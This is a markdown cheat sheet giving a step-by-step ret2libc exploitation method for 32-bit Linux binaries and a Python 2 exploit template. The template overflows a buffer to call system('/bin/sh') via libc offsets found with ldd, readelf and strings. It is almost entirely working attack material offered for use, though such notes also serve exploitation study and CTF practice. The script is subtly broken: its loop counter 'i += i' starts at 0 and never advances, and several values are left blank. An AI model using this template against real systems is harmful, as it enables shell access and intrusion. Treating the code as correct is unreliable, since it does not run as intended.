# Script for ret2libc exploit and methodology

## Methodology

- find offset to overwrite EIP

`python -c 'print "A"*600'`

- grab base adress of libc with ldd (check ASLR if random)

`ldd <binaryPath> | grep libc.so.6`

- grab the offset of system

`readelf -s /lib32/libc.so.6 | grep system@@`

- grab the offset of exit (on_exit)

`readelf -s /lib32/libc.so.6 | grep exit@@`

- grab the offset of /bin/sh binary

`strings -a -t x /lib32/libc.so.6 | grep /bin/sh`

## Script

```python
from subprocess import call
import struct

libc_base_addr = 

system_off = 
exif_off = 
arg_off = 

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exif_off)
arg_addr = struct.pack("<I",libc_base_addr+arg_off)

buf = "A" * <findOffset>
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < <findOffset>):
        print "Try %s" %i
        i += i
        ret = call(["<binaryPath>","arg1","arg2",buf])
```
